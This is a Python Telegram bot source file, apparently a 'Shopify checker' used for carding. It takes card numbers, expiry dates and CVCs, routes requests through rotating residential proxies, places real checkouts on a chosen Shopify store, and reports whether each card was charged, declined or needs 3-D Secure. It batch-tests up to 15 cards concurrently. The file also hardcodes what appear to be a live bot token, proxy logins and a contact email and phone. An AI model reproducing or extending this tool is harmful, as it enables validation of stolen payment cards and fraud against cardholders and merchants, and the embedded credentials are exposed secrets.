import asyncio
import logging
import random
import re
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import Message
from aiohttp import ClientSession, ClientTimeout, TCPConnector, ClientError
from bs4 import BeautifulSoup

API_TOKEN = "8137441321:AAHYLJt2PcMXteMTKaEokI6fZXOQyStjnxA"
ROTATING_PROXIES = [
    "evo-pro.porterproxies.com:61236:PP_3P822Y5DL9-country-US:0bykaznk",
    "la.residential.rayobyte.com:8000:hsy52795_gmail_com:ssdo22",
    # Add more proxies here!
]
MAX_CONCURRENT = 4  # Limit concurrent mass-checks

logging.basicConfig(level=logging.INFO, filename="shopifybot.log", filemode="a")
bot = Bot(token=API_TOKEN)
dp = Dispatcher()
user_shops = {}

# -------------- HELPERS -----------------

def get_random_proxy():
    return random.choice(ROTATING_PROXIES)

def parse_card(card_str):
    normalized = re.sub(r"[^\d|]", "|", card_str)
    numbers = [x for x in normalized.split("|") if x.isdigit()]
    if len(numbers) >= 4:
        return numbers[0], numbers[1], numbers[2], numbers[3]
    raise ValueError("Wrong card format")

def parse_cards_bulk(cards_blob):
    lines = re.split(r'[\r\n;,]+', cards_blob)
    result = []
    for line in lines:
        try:
            card_data = parse_card(line)
            result.append(card_data)
            if len(result) >= 15:
                break
        except Exception:
            continue
    return result

def normalize_url(site):
    if not site.startswith("http"):
        site = "https://" + site
    return site.rstrip("/")

async def fetch_json(session, url, proxy):
    try:
        async with session.get(url, proxy=proxy, timeout=12) as r:
            return await r.json()
    except Exception as e:
        logging.error(f"fetch_json error: {e}")
        return None

# ------------- SHOPIFY LOGIC --------------

async def analyze_shop(shop_url):
    for _ in range(len(ROTATING_PROXIES)):
        proxy = get_random_proxy()
        try:
            async with ClientSession(timeout=ClientTimeout(total=12), connector=TCPConnector(ssl=False)) as session:
                data = await fetch_json(session, f"{shop_url}/products.json", proxy)
                if data and data.get("products"):
                    products = data["products"]
                    cheapest = min((v for p in products for v in p["variants"]), key=lambda v: float(v["price"]))
                    return True, float(cheapest["price"])
        except Exception as e:
            logging.error(f"analyze_shop: {e}")
            continue
    return False, None

async def get_cheapest_product(shop_url, session):
    for _ in range(len(ROTATING_PROXIES)):
        proxy = get_random_proxy()
        try:
            data = await fetch_json(session, f"{shop_url}/products.json", proxy)
            if data and data.get("products"):
                products = data["products"]
                cheapest = min((v for p in products for v in p["variants"]), key=lambda v: float(v["price"]))
                return cheapest["id"], float(cheapest["price"])
        except Exception as e:
            logging.error(f"get_cheapest_product: {e}")
            continue
    raise Exception("Could not get product info")

async def add_to_cart(shop_url, session, product_id):
    proxy = get_random_proxy()
    data = {"id": product_id, "quantity": 1}
    try:
        async with session.post(f"{shop_url}/cart/add.js", data=data, proxy=proxy, timeout=10) as r:
            if r.status != 200:
                raise Exception("cart add error")
    except Exception as e:
        logging.error(f"add_to_cart: {e}")
        raise

async def get_checkout_page(shop_url, session):
    proxy = get_random_proxy()
    try:
        async with session.get(f"{shop_url}/checkout", proxy=proxy, timeout=12) as r:
            html = await r.text()
            url = str(r.url)
            return html, url
    except Exception as e:
        logging.error(f"get_checkout_page: {e}")
        raise

def find_checkout_form(soup):
    form = soup.find("form", {"id": "checkout_form"}) or \
           soup.find("form", {"action": lambda x: x and "checkout" in x})
    if not form:
        forms = soup.find_all("form")
        if forms:
            return forms[0]
    return form

async def fill_checkout_and_pay(shop_url, session, checkout_page, checkout_url, card_data, customer_data):
    soup = BeautifulSoup(checkout_page, "html.parser")
    form = find_checkout_form(soup)
    if not form:
        return "CHECKOUT_FORM_NOT_FOUND"
    payload = {}
    for inp in form.find_all("input"):
        if inp.get("name"):
            payload[inp["name"]] = inp.get("value", "")
    payload.update({
        "checkout[email]": customer_data["email"],
        "checkout[shipping_address][first_name]": customer_data["first_name"],
        "checkout[shipping_address][last_name]": customer_data["last_name"],
        "checkout[shipping_address][address1]": customer_data["address1"],
        "checkout[shipping_address][city]": customer_data["city"],
        "checkout[shipping_address][country]": customer_data["country"],
        "checkout[shipping_address][province]": customer_data["province"],
        "checkout[shipping_address][zip]": customer_data["zip"],
        "checkout[shipping_address][phone]": customer_data["phone"],
        "checkout[credit_card][number]": card_data[0],
        "checkout[credit_card][month]": card_data[1],
        "checkout[credit_card][year]": card_data[2],
        "checkout[credit_card][verification_value]": card_data[3],
    })
    pay_url = form.get("action", checkout_url)
    if not pay_url.startswith("http"):
        pay_url = shop_url + pay_url
    proxy = get_random_proxy()
    try:
        async with session.post(pay_url, data=payload, proxy=proxy, timeout=15) as r:
            text = await r.text()
            url = str(r.url)
            # 3DS check: url, meta, html
            if any(x in url for x in ["3ds", "3dsecure", "acs", "challenge"]) or \
               "3d secure" in text.lower() or "authentication required" in text.lower():
                return "3DS_REQUIRED"
            if "card was declined" in text.lower() or "declined" in text.lower():
                return "CARD_DECLINED"
            elif "thank you" in text.lower() or "order confirmation" in text.lower():
                return "CHARGED"
            else:
                return "UNKNOWN"
    except Exception as e:
        logging.error(f"fill_checkout_and_pay: {e}")
        return f"ERROR: {e}"

async def check_card_real(shop_url, card_tuple, session):
    try:
        product_id, price = await get_cheapest_product(shop_url, session)
        await add_to_cart(shop_url, session, product_id)
        checkout_page, checkout_url = await get_checkout_page(shop_url, session)
        customer_data = {
            "email": "makaroe999@gmail.com",
            "first_name": "Safe",
            "last_name": "Lab",
            "address1": "5 Madison Avenue",
            "city": "New York",
            "country": "United States",
            "province": "New York",
            "zip": "10010",
            "phone": "+12056063483"
        }
        resp = await fill_checkout_and_pay(shop_url, session, checkout_page, checkout_url, card_tuple, customer_data)
        return resp, price
    except Exception as e:
        logging.error(f"check_card_real: {e}")
        return f"ERROR: {e}", "?"

# ------------- HANDLERS ----------------

@dp.message(Command("addurl"))
async def addurl(message: Message):
    parts = message.text.strip().split()
    if len(parts) != 2:
        await message.answer("Usage: /addurl <shopify_url>")
        return
    shop_url = normalize_url(parts[1])
    user_id = message.from_user.id
    t0 = asyncio.get_event_loop().time()
    supported, price = await analyze_shop(shop_url)
    elapsed = asyncio.get_event_loop().time() - t0
    if supported:
        user_shops[user_id] = shop_url
        await message.answer(
            f"Site Added ✅\n"
            f"[⌯] Site: {shop_url}\n"
            f"[⌯] Gateway: Shopify Normal {price}$\n"
            f"[⌯] Response: CARD_DECLINED\n"
            f"[⌯] Cmd: $slf\n"
            f"[⌯] Time Taken: {elapsed:.2f} sec"
        )
    else:
        await message.answer("❌ Site not supported or not found.")

@dp.message(Command("sh"))
async def sh(message: Message):
    user_id = message.from_user.id
    if user_id not in user_shops:
        await message.answer("First, add a shop with /addurl <shopify_url>")
        return
    cards_blob = message.text.replace("/sh", "").strip()
    try:
        card_tuple = parse_card(cards_blob)
    except Exception:
        await message.answer("Usage: /sh <card_number|mm|yy|cvc>")
        return
    shop_url = user_shops[user_id]
    t0 = asyncio.get_event_loop().time()
    async with ClientSession(timeout=ClientTimeout(total=20), connector=TCPConnector(ssl=False)) as session:
        resp, price = await check_card_real(shop_url, card_tuple, session)
    elapsed = asyncio.get_event_loop().time() - t0
    await message.answer(
        f"[⌯] Site: {shop_url}\n"
        f"[⌯] Gateway: Shopify Normal {price}$\n"
        f"[⌯] Response: {resp}\n"
        f"[⌯] Cmd: $slf\n"
        f"[⌯] Time Taken: {elapsed:.2f} sec"
    )

@dp.message(Command("msh"))
async def msh(message: Message):
    user_id = message.from_user.id
    if user_id not in user_shops:
        await message.answer("First, add a shop with /addurl <shopify_url>")
        return
    cards_blob = message.text.replace("/msh", "").strip()
    cards = parse_cards_bulk(cards_blob)
    if not cards:
        await message.answer("No valid cards found (up to 15 per run, any separator: newline, |, ; etc.)")
        return
    shop_url = user_shops[user_id]
    result_lines = []
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    async with ClientSession(timeout=ClientTimeout(total=30), connector=TCPConnector(ssl=False)) as session:
        async def check_one(idx, card_tuple):
            t0 = asyncio.get_event_loop().time()
            async with sem:
                resp, price = await check_card_real(shop_url, card_tuple, session)
            elapsed = asyncio.get_event_loop().time() - t0
            result_lines.append(
                f"#{idx}: [⌯] Response: {resp} | Time: {elapsed:.2f} sec"
            )
            if resp == "3DS_REQUIRED":
                try:
                    await get_checkout_page(shop_url, session)
                except Exception:
                    pass
        await asyncio.gather(*(check_one(idx, card) for idx, card in enumerate(cards, 1)))
    await message.answer(
        f"[⌯] Site: {shop_url}\n"
        f"[⌯] Gateway: Shopify Normal {price}$\n"
        + "\n".join(result_lines)
    )

@dp.message(Command("help"))
async def help_command(message: Message):
    await message.answer(
        "Shopify Checker Bot commands:\n"
        "/addurl <shopify_url> — add a shop\n"
        "/sh <card|mm|yy|cvc> — single card check\n"
        "/msh <card1|mm|yy|cvc>|<card2|mm|yy|cvc>|... — batch check up to 15 cards\n"
        "/help — show this help"
    )

@dp.message(Command("start"))
async def start(message: Message):
    await help_command(message)

if __name__ == "__main__":
    import sys, platform
    if platform.system() == "Windows":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(dp.start_polling(bot))